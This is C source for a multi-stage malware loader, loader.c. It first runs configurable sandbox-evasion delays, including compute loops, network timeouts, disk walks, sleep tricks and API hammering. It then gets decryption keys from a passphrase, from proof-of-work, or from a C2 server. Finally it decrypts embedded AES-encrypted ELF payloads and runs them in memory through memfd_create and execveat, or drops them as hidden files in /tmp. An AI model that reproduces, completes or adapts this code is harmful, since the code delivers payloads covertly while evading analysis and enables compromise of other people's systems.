/* loader.c - Dynamic Loader matching Builder and decrypt.h Layout */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <fcntl.h>

#include "include/payload.h"
#include "include/decrypt.h"
#include "include/key_derivation.h"


#ifdef USE_FAMILY_COMPUTE
  #include "include/compute.h"
#endif

#ifdef USE_FAMILY_NETWORK
  #include "include/network.h"
#endif

#ifdef USE_FAMILY_STORAGE
  #include "include/storage.h"
#endif

#ifdef USE_FAMILY_SYNCHRONIZATION
  #include "include/synchronization.h"
#endif

#ifdef USE_FAMILY_TEMPORAL
  #include "include/temporal.h"
#endif

#ifdef USE_FAMILY_HAMMERING
  #include "include/hammering.h"
#endif

/**
 * Dispatches the configured delay or execution manipulation technique 
 * based on the technique ID and parameters specified for the current stage.
 *
 * @param tech_id Numeric ID representing the specific technique strategy.
 * @param param Parameter value associated with the technique (e.g., duration or iterations).
 * @param stage_idx Index of the active execution stage.
 */
static void dispatch_evasion_technique(int tech_id, int param, int stage_idx) {
    switch (tech_id) {
        #ifdef USE_FAMILY_COMPUTE
        case 101: delay_hash_chain((long long)param); break;
        case 102: delay_float_math(param); break;
        case 103: delay_compression_spam(param); break;
        case 104: delay_prime_calculation(param); break;
        case 105: delay_bitwise_ops(param); break;
        case 106: delay_recursive_fib(param); break;
        case 107: delay_junk_logic(param); break;
        case 108: 
            delay_prime_calculation(param); 
            break;
        #endif

        #ifdef USE_FAMILY_NETWORK
        case 201: 
            delay_tcp_timeout(STAGE_NETWORK_IP[stage_idx], STAGE_NETWORK_PORT[stage_idx], param); 
            break;
        case 202: 
            delay_dns_lookup_spam(param); 
            break;
        case 203: 
            delay_http_request(STAGE_NETWORK_HOST[stage_idx], param); 
            break;
        case 204: 
            delay_udp_recv(STAGE_NETWORK_PORT[stage_idx], param); 
            break;
        case 205: 
            delay_ntp_sync_check(STAGE_NETWORK_HOST[stage_idx], param); 
            break;
        case 206: 
            delay_network_garbage(STAGE_NETWORK_IP[stage_idx], param); 
            break;
        case 207: 
            delay_reverse_dns(STAGE_NETWORK_IP[stage_idx], param); 
            break;
        case 208:
            // C2 key retrieval handled directly in key derivation loop
            break;
        #endif

        #ifdef USE_FAMILY_STORAGE
        case 301: delay_disk_walk("/usr", (long long)param); break;
        case 302: delay_heavy_io_blips(param); break;
        case 303: delay_entropy_source(param); break;
        case 304: delay_sparse_file_bomb((long long)param); break;
        case 305: delay_mkdir_spam(param); break;
        case 306: delay_memory_pressure(param, 10); break;
        case 307: delay_metadata_stat(param); break;
        #endif

        #ifdef USE_FAMILY_SYNCHRONIZATION
        case 401: delay_thread_join(param); break;
        case 402: delay_queue_blocking(param); break;
        case 403: delay_pipe_wait(param); break;
        case 404: delay_semaphore_race(param); break;
        case 405: delay_event_wait(param); break;
        case 406: delay_barrier(param); break;
        case 407: delay_condition_var(param); break;
        #endif

        #ifdef USE_FAMILY_TEMPORAL
        case 501: sleep_standard((unsigned int)param); break;
        case 502: sleep_select((double)param); break;
        case 503: sleep_nanosleep((double)param); break;
        case 504: sleep_signal((unsigned int)param); break;
        case 505: sleep_subprocess_wait((unsigned int)param); break;
        case 506: sleep_ppoll((double)param); break;
        case 507: sleep_itimer((double)param); break;
        #endif

        #ifdef USE_FAMILY_HAMMERING
        case 601: execute_api_hammering(param); break;
        case 602: memory_hammering((long long)param); break;
        #endif

        default:
            break;
    }
}

/**
 * Validates ELF header signature and executes the decrypted payload buffer
 * either entirely in-memory using memfd_create or via a temporary disk file.
 *
 * @param buffer Pointer to the raw decrypted payload buffer.
 * @param size Size of the payload buffer in bytes.
 * @param exec_mode Execution strategy flag (1 = in-memory memfd, other = disk artifact).
 * @param stage_num Active stage identifier index.
 */
static void execute_payload_buffer(const unsigned char *buffer, size_t size, int exec_mode, int stage_num) {
    if (size < 4) {
        return;
    }

    // Verify magic bytes for valid ELF binary signature (\x7fELF)
    if (buffer[0] != 0x7f || buffer[1] != 'E' || buffer[2] != 'L' || buffer[3] != 'F') {
        return;
    }

    if (exec_mode == 1) {
        // In-memory execution using an anonymous file descriptor
        int fd = memfd_create("anon_stage", MFD_CLOEXEC);
        if (fd < 0) {
            return;
        }

        if (write(fd, buffer, size) != (ssize_t)size) {
            close(fd);
            return;
        }

        char *argv[] = { "anon_stage", NULL };
        char *envp[] = { NULL };

        execveat(fd, "", argv, envp, AT_EMPTY_PATH);
        close(fd);
    } else {
        // Disk-based execution path writing binary payload to /tmp
        char tmp_path[64];
        snprintf(tmp_path, sizeof(tmp_path), "/tmp/.stage_%d_%d", getpid(), stage_num);

        FILE *f = fopen(tmp_path, "wb");
        if (!f) {
            return;
        }

        fwrite(buffer, 1, size, f);
        fclose(f);

        chmod(tmp_path, S_IRWXU);

        char *argv[] = { tmp_path, NULL };
        char *envp[] = { NULL };

        execve(tmp_path, argv, envp);
        unlink(tmp_path);
    }
}

/**
 * Main application entry point driving multi-stage execution, key derivation, 
 * payload decryption, and process isolation.
 *
 * @return 0 on full execution sequence completion, 1 on payload failure.
 */
int main(void) {
    for (int i = 0; i < TOTAL_STAGES; i++) {
        int tech_id = STAGE_TECH_ID[i];
        int tech_param = STAGE_TECH_PARAM[i];
        int exec_mode = STAGE_EXEC_MODE[i];
        int deriv_mode = STAGE_KEY_DERIVATION_MODE[i];
        int pow_diff = STAGE_POW_DIFFICULTY[i];
        const char *current_passphrase = STAGE_PASSPHRASES[i];

        // Execute configured delay routine prior to payload decryption
        dispatch_evasion_technique(tech_id, tech_param, i);

        size_t decrypted_size = 0;
        unsigned char *decrypted_buffer = NULL;

        // Obtain decryption key based on configured derivation strategy
        if (deriv_mode == 3 || tech_id == 208) {
            // Mode 3: External C2 Key Retrieval
            unsigned char *c2_key = derive_key_c2(
                STAGE_NETWORK_HOST[i],
                STAGE_NETWORK_PORT[i],
                STAGE_NETWORK_PATH[i]
            );

            if (c2_key) {
                decrypted_buffer = aes_decrypt_with_key(ENCRYPTED_PAYLOADS[i], c2_key, &decrypted_size);
                free(c2_key);
            }
        } else if (deriv_mode == 2 || tech_id == 108) {
            // Mode 2: Proof-of-Work key derivation
            unsigned char *derived_key = derive_key_pow(current_passphrase, pow_diff);
            if (derived_key) {
                decrypted_buffer = aes_decrypt_with_key(ENCRYPTED_PAYLOADS[i], derived_key, &decrypted_size);
                free(derived_key);
            }
        } else {
            // Mode 1: Passphrase hashing (SHA-256)
            decrypted_buffer = aes_decrypt(ENCRYPTED_PAYLOADS[i], current_passphrase, &decrypted_size);
        }

        if (!decrypted_buffer || decrypted_size == 0) {
            return 1;
        }

        // Fork execution to isolate payload execution context per stage
        pid_t pid = fork();

        if (pid < 0) {
            free(decrypted_buffer);
            return 1;
        }

        if (pid == 0) {
            // Child process: execute payload image
            execute_payload_buffer(decrypted_buffer, decrypted_size, exec_mode, i + 1);
            _exit(1);
        } else {
            // Parent process: await stage completion and clean memory resources
            int status;
            waitpid(pid, &status, 0);
            free(decrypted_buffer);
        }
    }

    return 0;
}
